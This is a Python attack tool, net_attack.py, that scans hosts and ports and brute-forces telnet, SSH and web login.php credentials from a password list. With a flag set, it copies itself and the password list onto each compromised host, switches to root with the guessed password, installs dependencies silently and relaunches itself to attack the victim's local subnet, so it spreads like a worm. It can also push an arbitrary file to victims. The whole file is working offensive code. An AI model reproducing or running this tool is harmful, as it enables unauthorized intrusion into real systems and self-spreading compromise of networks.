#!/usr/bin/python3
'''
Darpan Katarya
Python based tool for bruteforcing telnet, ssh, and http login
'''

import os
import sys
import paramiko
import requests
from scapy.all import *
import telnetlib
import time

def help():
    # This function prints the usage instructions for the script.
    print("Usage: ./net_attack.py -t <target_file> -p <ports> -u <username> -f <password_file> -d <deploy_file>")
    print("Example: ./net_attack.py -t my_ip_list.txt -p 22,23,25,80 -u admin -f my_password_list.txt -d test.txt")

def read_ip_list(ip_file):                                                  # This function reads a file containing a list of IP addresses.
    with open(ip_file, 'r') as file:
        ip_addresses = [ip.strip() for ip in file.readlines()]              # It reads each line in the file, removes any leading/trailing whitespace, and stores the IP addresses in a list.
    return ip_addresses                                                     # It returns the list of IP addresses.

def is_reachable(ip):                                                       # This function checks if an IP address is reachable by sending an ICMP request.
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)              # It sets the logging level to ERROR to suppress unnecessary output.
    icmp_req = IP(dst=ip) / ICMP()                                          # It creates an ICMP request packet.
    response, unanswered = sr(icmp_req, timeout=2, verbose=0)               # It sends the ICMP request and waits for a response.
    if response:                                                            # If a response is received, the IP address is reachable.
        return True
    else:                                                                   # If no response is received, the IP address is not reachable.
        return False

def scan_port(ip, port):                                                    # This function scans a specific port on an IP address.
    packet = IP(dst=ip) / TCP(dport=port, flags='S')                        # It creates a SYN packet.
    response = sr1(packet, timeout=2, verbose=0)                            # It sends the SYN packet and waits for a response.
    if response is not None and response.haslayer(TCP):                     # If a response is received and it is a TCP packet,
        if response[TCP].flags == 'SA':                                     # and if the flags field of the TCP layer is 'SA' (SYN-ACK), the port is open.
            return True
        else:                                                               # If the flags field is not 'SA', the port is closed.
            return False
    else:                                                                   # If no response is received, the port is considered closed.
        return False


def bruteforce_telnet(ip, port, username, password_list_filename, deploy_file, propagate_flag):
    with open(password_list_filename, 'r') as file:                                                  # Read passwords from the specified file
        passwords = [password.strip() for password in file.readlines()]                              # Read each line, remove whitespace, and store passwords in a list.

    for password in passwords:                                                              # Iterate through the password list
        try:                                                                                # Try block to catch the error if any
            tn = telnetlib.Telnet(ip, port)                                                 # Establish a Telnet connection to the specified IP and port.
            tn.read_until(b"login: ")                                                       # Wait for the login prompt.
            tn.write(username.encode('ascii') + b"\n")                                      # Send the encoded username followed by a newline.
            tn.read_until(b"Password: ")                                                    # Wait for the password prompt.
            tn.write(password.encode('ascii') + b"\n")                                      # Send the encoded password followed by a newline.
            response = tn.read_until(b"\r\nLogin incorrect", timeout=5).decode('ascii')     # Read the response and decode it.

            if "Login incorrect" not in response:                                           # Check if authentication is successful
                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')  # Get the current timestamp.
                print("----------------------------------------------------")
                print(f"[+] {timestamp}\n[*] AUTHENTICATION : SUCCESSFUL\n[+] IP : {ip}\n[+] USERNAME : {username}\n[+] Password : {password}")
                print("----------------------------------------------------")

                if propagate_flag:                                                              # Check if propagate flag is enabled
                    if self_propagate_telnet(tn):                                               # Call the self_propagate_telnet function if propagation is enabled.
                        print("[*] SELF PROPAGATION : SUCCESSFUL")                              # If the function is successful, prompt the user
                        print("[*] STARTING COMMAND EXECUTION ON VICTIM")
                        tn.write(b"su root\n")                                                  # Switch to the root user  # Switch to the root user
                        time.sleep(1)                                                           # Wait 1 second for server to process 
                        tn.write((password + "\n").encode('ascii'))                             # Send the root password
                        tn.write(b"pip install scapy requests paramiko > /dev/null 2>&1; python3 /tmp/net_attack.py -L -i eth0 -p 22 -f /tmp/password_list.txt -u admin & \necho -e 'XpwnedX-'$? ;\n")
                        #first install the dependencies and redirect the error and output to /dev/null (so nothing is displayed) ; run the script on the victim and then check output of last command using $?
                        server_response = tn.read_very_eager().decode('utf-8').strip()          # Read the server response.
                        time.sleep(1)
                        server_response = tn.read_until(b'XpwnedX-0').decode('utf-8').strip()   # Read the server response.

                        if 'XpwnedX-0' in server_response:                                      # Check if XpwnedX-0 is in server response
                            print("[*] COMMAND EXECUTION SUCCESSFUL")                           # Print command execution success
                        else:
                            print("[*] COMMAND EXECUTION FAILED")                               # Else print execution failed

                        tn.close()                                                              # Close the telnet connection 

                if deploy_file:                                                 # Deploy file if specified
                    deploy_telnet_file(tn, deploy_file)                         # Call the deploy_telnet_file function if a file is specified.
                    print(f"[*] FILE {deploy_file} DEPLOYMENT : SUCCESSFUL")                
                return f"{username}:{password}"                                 # Return successful authentication details
            else:
                print(f"[X] USERNAME : {username} | PASSWORD : {password}")
                tn.close()
        except:
            pass

    return ""                                                                   # Return empty string if authentication fails

def deploy_telnet_file(tn, deploy_file):                                # Defining a function for deploying a file via telnet. It accepts two arguments, 'tn' and 'deploy_file'. 
    try:
                                                                        # Copy the original file
        remote_filename = os.path.basename(deploy_file)                 # Extracts the filename from the provided path
        remote_path = "/tmp/" + remote_filename                         # Constructs the remote path by appending the filename to the "/tmp/" directory
                                                                        # Start the 'cat' command with the heredoc delimiter
        tn.write(f"cat > {remote_path} << 'EOF'\n".encode())            # Sends a command to write to the specified remote path using a heredoc syntax

        with open(deploy_file, 'r') as local_file:
            for line in local_file:
                tn.write((line + "\n").encode())                            # Sends each line from the local file to the remote server through the Telnet connection
                                                                            # End the 'cat' command with the heredoc delimiter
        tn.write("EOF\n".encode())                                          # Signals the end of the remote file write

        server_response = tn.read_very_eager().decode()                     # Reads the server response after the file deployment
    except Exception as e:
        print("FILE " + deploy_file + " DEPLOYMENT : FAILED\n" + str(e))    # Prints an error message if any exception occurs during deployment

def file_exists(tn, deploy_file):                         # Defining a helper function to check if a file exists. It accepts two arguments, 'tn' and 'deploy_file'.
    remote_filename = os.path.basename(deploy_file)       # Extract the filename from the provided file path.
    remote_path = "/tmp/" + remote_filename               # Construct the remote path by appending the filename to "/tmp/".

    tn.write(f"ls {remote_path}\n".encode())              # Send a command to the telnet session to list the files in the remote path.
    time.sleep(2)                                         # Pause the execution for 2 seconds to allow time for the command to be executed.
    response = tn.read_very_eager()                       # Read the response from the telnet session.
    response_str = response.decode('utf-8')               # Decode the byte string response into a regular string.

    if "No such file or directory" not in response_str:         # Check if the response contains the message "No such file or directory".
        print("[*] FILE " + deploy_file + " : ALREADY EXISTS")  # Print a message indicating that the file already exists.
        return True                                             # Return True to indicate that the file exists.
    else:
        return False                                            # Return False to indicate that the file doesn't exist.


def self_propagate_telnet(tn):                                      # Defining a function to self-propagate files via telnet. It accepts one argument, 'tn'.
    try:
        net_attack_exists = file_exists(tn, "net_attack.py")        # Check if the file 'net_attack.py' exists.
        password_list_exists = file_exists(tn, "password_list.txt") # Check if the file 'password_list.txt' exists.

        if net_attack_exists and password_list_exists:              # Check if both files exist.
            print("[*] SELF PROPAGATION : SKIPPED")                 # Print a message indicating that self-propagation is skipped.
            return                                                  # Exit the function.
        else:
            if not net_attack_exists:
                deploy_telnet_file(tn, "net_attack.py")             # Deploy the file 'net_attack.py' using the 'deploy_telnet_file' function.
                time.sleep(3)                                       # Pause the execution for 3 seconds.

            if not password_list_exists:
                deploy_telnet_file(tn, "password_list.txt")         # Deploy the file 'password_list.txt' using the 'deploy_telnet_file' function.
                time.sleep(3)                                       # Pause the execution for 3 seconds.

            return True                                             # Return True to indicate successful propagation.

    except Exception as e:
        print("Failed to propagate files via Telnet: " + str(e))    # Print an error message if an exception occurs during propagation.

def bruteforce_ssh(ip, port, username, password_list_filename, deploy_file, propagate_flag):
                                                                        # Open the password list file
    with open(password_list_filename, 'r') as file:
        passwords = [password.strip() for password in file.readlines()] # Read passwords from the file and remove leading/trailing whitespaces
    for password in passwords:                                          # Iterate over each password in the password list
                                                                        # Attempt SSH connection using the current password
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            # Set policy for automatically adding host keys
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # Connect to the SSH server using the provided credentials
            ssh.connect(ip, port=int(port), username=username, password=password, timeout=3, banner_timeout=3)
            # Print authentication success message with IP, username, and password
            print("----------------------------------------------------")
            print(f"[+] AUTHENTICATION : SUCCESSFUL\n[+] IP : {ip}\n[+] USERNAME : {username}\n[+] PASSWORD : {password}")
            print("----------------------------------------------------")

            # Check if file deployment is requested
            if deploy_file:
                # Call deploy_ssh_file function to deploy the file on the remote server
                if deploy_ssh_file(ssh, deploy_file):
                    # Print file deployment success message
                    print(f"[*] FILE {deploy_file} DEPLOYMENT : SUCCESSFUL")

            # Check if self-propagation is requested
            if propagate_flag:
                # Open SFTP session
                sftp = ssh.open_sftp()
                try:
                    # Check if 'net_attack.py' and 'password_list.txt' already exist on the remote host
                    sftp.stat("/tmp/net_attack.py")
                    sftp.stat("/tmp/password_list.txt")
                    # Print message indicating that the files already exist and self-propagation is skipped
                    print("[*] FILES 'net_attack.py' AND 'password_list.txt' ALREADY EXIST ON THE REMOTE HOST")
                    print('[*] SELF PROPAGATION : SKIPPED')
                    return True
                except IOError:
                    # If the files do not exist, attempt to self-propagate
                    if self_propagate_ssh(ssh):
                        # Print self-propagation success message
                        print("[*] SELF PROPAGATION : SUCCESSFUL")
                        # Print message indicating starting of command execution on the victim
                        print('[*] STARTING COMMAND EXECUTION ON VICTIM')
                        # Execute command on the victim to start the attack
                        stdin, stdout, stderr = ssh.exec_command(f'echo {password} | su root; pip install paramiko > /dev/null ; pip install scapy > /dev/null ; pip install requests > /dev/null ; cd /tmp; python3 net_attack.py -L -i eth0 -p 22 -u admin -f password_list.txt > /dev/null & echo $?')
                        # Read the exit status of the command execution
                        output = int(stdout.read().decode().strip())
                        print(output)
                        # Check if the command execution was successful based on the exit status
                        if output == 0:
                            print("COMMAND EXECUTION : SUCCESSFUL")
                        else:
                            print("COMMAND EXECUTION : FAILED")
                    else:
                        # Print self-propagation failure message
                        print("[X] SELF PROPAGATION : FAILED")

            return True

        # Handle any exception that occurs during the SSH connection attempt
        except Exception as e:
            print(f"[X] USERNAME : {username} | PASSWORD : {password}")
        
        # Close the SSH connection
        finally:
            ssh.close()

def deploy_ssh_file(ssh, deploy_file, propagate_flag=False):
    try:
        # Copy the original file
        remote_filename = os.path.basename(deploy_file)  # Get the filename from the full path
        remote_path = f"/tmp/{remote_filename}"  # Construct the remote path

        sftp = ssh.open_sftp()
        sftp.put(deploy_file, remote_path)
        #print(f"File : '{deploy_file}' deployed successfully via SSH.")
        return True

    except Exception as e:
        print(f"Failed to transfer file via SSH: {str(e)}")


def self_propagate_ssh(ssh):
    try:
        # Specify the file names
        deploy_file1 = "net_attack.py"
        deploy_file2 = "password_list.txt"

        # Use the deploy_ssh_file function to deploy the files
        deploy_ssh_file(ssh, deploy_file1)
        print(f"FILE '{deploy_file1}' DEPLOYMENT : SUCCESSFUL")

        deploy_ssh_file(ssh, deploy_file2)
        print(f"FILE '{deploy_file2}' DEPLOYMENT : SUCCESSFUL")

        return True  # Return True if the operation was successful
    except Exception as e:
        print(f"Failed to transfer file via SSH: {str(e)}")
        return False  # Return False if an error occurred

def bruteforce_web(ip, port, username, password_list_filename):
    # Check if a web server and web page exist
    url = f"http://{ip}:{port}"
    try:
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Failed to access {url}. Web server or web page not found.")
            return
    except requests.exceptions.RequestException as e:
        print(f"Connection error: {str(e)}")
        return

    login_url = f"{url}/login.php"
    try:
        response = requests.get(login_url)
        if response.status_code != 200:
            print(f"Failed to access login page {login_url}.")
            return
        print(f"[*] Login page detected at {login_url}")
    except requests.exceptions.RequestException as e:
        print(f"Connection error: {str(e)}")
        return

    with open(password_list_filename, 'r') as file:
        passwords = [password.strip() for password in file.readlines()]

        for password in passwords:
            #print(f"[*] TRYING CREDENTIALS :\n[?] {username} : {password}")
            if check_login_success(login_url, username, password):
                print(f"\n[+] AUTHENTICATION : SUCCESSFUL\n[+] IP : {ip}\n[+] USERNAME : {username}\n[+] PASSWORD : {password}" )
                return
            else:
                print(f"[X] IP : {ip} | PORT : {port} | USERNAME : {username} | PASSWORD : {password} | AUTHENTICATION : FAILED")
                time.sleep(1)

    print("[X] BRUTEFORCE : FAILED")


def check_login_success(url, username, password):
    payload = {
        'username': username,
        'password': password
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    response = requests.post(url, data=payload, headers=headers)

    if response.status_code == 200 and 'Welcome admin!' in response.text:
        return True
    else:
        return False


def create_banner(text, char='-'):
    # Determine the length of the banner
    length = len(text) + 4

    # Create the top and bottom rows of the banner
    top_bottom_row = char * length

    # Create the middle row of the banner
    middle_row = f"{char} {text} {char}"

    # Print the banner
    print("\n"+top_bottom_row)
    print(middle_row)
    print(top_bottom_row)

def main():
    if len(sys.argv) < 9:
        help()
        sys.exit(1)

    args = sys.argv[1:]  # Get the arguments (excluding the script name)

    # Initialize variables
    flags = {'-t': None, '-p': None, '-u': None, '-f': None, '-d': None, '-i': None, '-L': False, '-P': False}

    # Assign values to flags
    for flag in flags.keys():
        if flag in args:
            index = args.index(flag) + 1
            if flag in ['-L', '-P']:
                flags[flag] = True
            elif index < len(args):
                flags[flag] = args[index]

    # Check if -L flag is present
    if flags['-L']:
        if flags['-i'] is None:
            print("Error: Please specify an interface with -i when using -L.")
            sys.exit(1)
        # Obtain the IP address of the interface
        ip = str(get_if_addr(flags['-i']))

        # Extract the network address
        network = str(ip).split('.')
        network = network[0] + '.' + network[1] + '.' + network[2] + '.'

        # Generate a list of all IP addresses
        ip_addresses = []
        for i in range(1, 256):
            addr = network + str(i)
            ip_addresses.append(addr)
    else:
        ip_addresses = read_ip_list(flags['-t'])

    ports = flags['-p'].split(',')

    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

    for ip in ip_addresses:
        create_banner(f'{timestamp} | PROBING IP: {ip}')
        if is_reachable(ip):
            for port in ports:
                if scan_port(ip, int(port)):
                    print(f"[*] Port {port} is open on {ip}.")
                    if port in ['80', '8080', '8888']:  # Web ports
                        create_banner(f'BRUTEFORCE WEB : START | IP: {ip} | PORT : {port}')
                        bruteforce_web(ip, int(port), flags['-u'], flags['-f'])
                    elif port == '23':  # Telnet port
                        create_banner(f'{timestamp} | BRUTEFORCE TELNET : START | IP: {ip} | PORT : {port}')
                        result = bruteforce_telnet(ip, int(port), flags['-u'], flags['-f'], flags['-d'], flags['-P'])
                        if result:
                            print(f"")
                        else:
                            print(f"")
                            print(f"[X] UNABLE TO BRUTEFORCE ON {ip}:{port} WITH PROVIDED USERNAME AND PASSWORD LIST")
                    elif port == '22':  # SSH port
                        create_banner(f'BRUTEFORCE SSH : START | IP: {ip} | PORT : {port}')
                        result = bruteforce_ssh(ip, int(port), flags['-u'], flags['-f'], flags['-d'], flags['-P'])
                        if result:
                            print(f"")
                        else:
                            print(f'')
                            print(f"[X] UNABLE TO BRUTEFORCE ON {ip}:{port} WITH PROVIDED USERNAME AND PASSWORD LIST")
                else:
                    print(f"[*] Port {port} is closed on {ip}.")
        else:
            print(f"[X] Host {ip} is not reachable.\n")
    print(f"END\n{timestamp}")
main()